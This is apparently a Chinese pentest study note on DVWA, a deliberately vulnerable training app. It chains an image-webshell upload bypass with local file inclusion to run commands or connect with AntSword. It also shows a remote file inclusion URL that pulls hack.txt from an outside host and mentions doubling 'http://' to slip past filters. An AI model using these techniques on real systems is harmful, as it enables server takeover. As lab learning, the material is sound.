**渗透思路**
**有时候当我们发现了一个本地的文件包含漏洞，但我们也仅仅只能去读取一些本地的文件，没有办法去进行更深层次的利用，然后又在这个网站上发现了一个文件上传漏洞，同时这个文件上传漏洞如果单个来看是比较鸡肋的，比如它做了限制，只能发送图片，而这个图片却没有做严格的限制，我们可以通过一些图片木马来绕过上传，而这两个漏洞结合一下的话，就能达到很大效果了 比如我们上传了一个图片木马，没法单独去使用，但我们可以使用文件包含漏洞，去对这个文件进行包含，也就是说两个文件互相结合进行利用**

# 本地文件包含

上传文件到本地之后，通过可以访问资源的页面访问该文件

以DVMA为例

![image-20241009203148225](%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20241009203148225.png)



上传图片马后将路径保存，可在文件包含中访问该马，可以进行命令执行或者蚁剑连接

![image-20241009203256567](%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20241009203256567.png)

# 远程文件包含

可以将文件放在服务器上，在路径后拼接服务器网址即可访问服务器上的资源

```
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://192.168.126.129/hack.txt
```

有的会对http://和https://进行过滤，可以使用复写绕过



访问txt文件可以，尝试访问马